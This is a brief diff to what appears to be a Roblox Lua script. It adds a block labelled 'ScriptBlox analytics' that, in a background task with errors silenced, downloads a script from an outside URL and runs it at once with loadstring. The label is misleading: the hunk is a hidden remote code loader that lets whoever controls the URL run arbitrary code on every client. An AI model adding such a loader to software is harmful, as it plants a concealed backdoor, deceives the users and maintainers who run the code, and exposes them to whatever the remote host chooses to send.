@@ -16,6 +16,11 @@ if not task then
     }
 end
 
+-- ScriptBlox analytics (async so a slow HttpGet never blocks the main thread)
+task.spawn(function()
+    pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_3c37645b6d4a", "1.0.0", false) end)
+end)
+
 -- Services
 local Players           = game:GetService("Players")
 local RunService        = game:GetService("RunService")
